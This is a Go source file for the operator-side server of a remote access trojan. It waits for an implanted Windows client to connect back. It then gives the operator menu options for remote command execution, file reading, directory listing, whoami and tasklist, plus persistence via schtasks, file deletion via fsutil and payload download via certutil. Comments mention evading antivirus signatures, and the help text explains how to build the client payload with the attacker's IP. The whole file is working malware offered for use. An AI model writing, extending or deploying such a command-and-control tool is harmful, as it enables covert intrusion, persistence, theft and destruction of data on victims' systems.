package main
import("fmt")
import("net")
import("bufio")
import("strings")
import("time")
import("os")
func main () {
	bobscanner := bufio.NewScanner(os.Stdin)
	fmt.Print("Waiting for client to connect...\n") // make connection
	option := "h-server-options"
	connection, errer := net.Listen("tcp", ":80")
	if (errer != nil) {
		fmt.Print("Error, port is already in use\nit's possible something else failed\nexiting...")
		return
	}
	connectwo, errer := connection.Accept()
	if (errer != nil) {
		fmt.Print("\nError when accepting connection\nexiting...")
		return
	}
	fmt.Print("Connection made!\n") // end make connection
	for { // for loop that breaks when server exists
		fmt.Print("\n\nOptions:\n0. Help\n1. Exit Server\n2. Exit Server And Client\n3. cat\n4. ls\n5. LOLBas module (Maintain access, file delete, and file upload)\n6. Whoami\n7. Tasklist (warning: executes tasklist.exe)\n8. Execute command\n9. pwd: ")
		fmt.Scanln(&option)
		if (option == "9") {
			fmt.Fprintf(connectwo, "b\n")
			out,_ := bufio.NewReader(connectwo).ReadString('\n')
			fmt.Print(out)
		}
		if (option == "8") { // reverse shell
			fmt.Fprintf(connectwo, "a\n")
			fmt.Print("Command: ")
			bobscanner.Scan()
			cmd := bobscanner.Text()
			fmt.Fprintf(connectwo, cmd + "\n")
			out,_ := bufio.NewReader(connectwo).ReadString('\n')
			out = strings.Replace(out, "COMMANDSAREFUN", "\n", -1)
			fmt.Print(out)
		}
		if (option == "7") { // tasklist
			fmt.Fprintf(connectwo, "9\n")
			out,_ := bufio.NewReader(connectwo).ReadString('\n')
			out = strings.Replace(out, "74211553", "\n", -1) // this may become a signature, obf if needed
			fmt.Print(out)
		}
		if (option == "6") { //whoami
			fmt.Fprintf(connectwo, "8\n")
			out,_ := bufio.NewReader(connectwo).ReadString('\n')
			fmt.Print(out)
		}
		if (option == "5") { //LOLBas 
			fmt.Print("\n\nWarning: these all execute programs which can be detected by anti viruses\n0. Go back\n1. maintain access via schtasks\n2. Delete file via fsutil\n3. File download via certutil: ")
			choice := "02"
			fmt.Scanln(&choice)
			if (choice == "1") { //schtasks maintain access
				fmt.Fprintf(connectwo, "5\n")
				fmt.Print("Command sent\nOutput:")
				out,_ := bufio.NewReader(connectwo).ReadString('\n')
				fmt.Print(out)
			}
			if (choice == "2") { // delete file fsutil
				fmt.Print("File to delete: ")
				bobscanner.Scan()
				choicer := bobscanner.Text()
				fmt.Fprintf(connectwo, "6\n")
				fmt.Fprintf(connectwo, choicer + "\n")
				fmt.Print("Command sent\nOutput:")
				out,_ := bufio.NewReader(connectwo).ReadString('\n')
				fmt.Print(out)
			}
			if (choice == "3") { // file download certutil
				fmt.Print("File URL: ")
				bobscanner.Scan()
				choicer := bobscanner.Text()
				fmt.Fprintf(connectwo, "7\n")
				time.Sleep(time.Second)
				fmt.Fprintf(connectwo, choicer + "\n")
				out,_ := bufio.NewReader(connectwo).ReadString('\n')
				time.Sleep(time.Second * 5)
				fmt.Print("Command sent\n",out)
			}
		}
		if (option == "0") { // help
			fmt.Print("Made by Coffee&Shells\nHow to make a client/payload: open the h.go file, change the IP to yours, if you change the port you'll also have to change the port on the server. Build the file, and you now have your payload.\nHow to fix most bugs: exit the server, the client will not exit, and re-open the server\n")
		}
		if (option == "1") { // exit server 
			return
		}
		if (option == "2") { // exit client and server
			fmt.Print("Are you sure? Y/N: ")
			choice := ""
			fmt.Scanln(&choice)
			if (choice == "Y") {
				fmt.Fprintf(connectwo, "3\n")
				fmt.Print("Run server again to make sure client has exited")
				return
			} else {
				fmt.Print("Exit canceled...\n")
			}
		}
		if (option == "4") { // ls/dir
			fmt.Fprintf(connectwo, "4\n")
			fmt.Print("Dir to read: ")
			bobscanner.Scan()
			aaa := bobscanner.Text()
			fmt.Fprintf(connectwo, aaa + "\n")
			for {
				stuff2, err := bufio.NewReader(connectwo).ReadString('\n')
				if (err != nil) {
					fmt.Print("Error, client possibly killed")
					break
				}
				if (stuff2 == "EOF" || stuff2 == "EOF\n") {
					break
				}
				if (stuff2 == "ERROR" || stuff2 == "ERROR\n") {
					fmt.Print("Dir not found, probably\n")
					break
				}
				fmt.Print(stuff2)
			}
		}
		if (option == "3") { //cat
			fmt.Fprintf(connectwo, "1\n")
			fmt.Print("File to read: ")
			bobscanner.Scan()
			file := bobscanner.Text()
			fmt.Fprintf(connectwo, file + "\n")
			for {
				stuff, er := bufio.NewReader(connectwo).ReadString('\n')
				stuff2 := strings.Replace(stuff, "ඞ", "\n", -1)
				fmt.Print(stuff2)
				if (er != nil) {
					fmt.Print("Error\nbreaking...")
					break
				}
				if (stuff == "ERROR\n") {
					fmt.Print("Error, file not found (probably)")
					break
				}
				break
			}
		}
	}
}
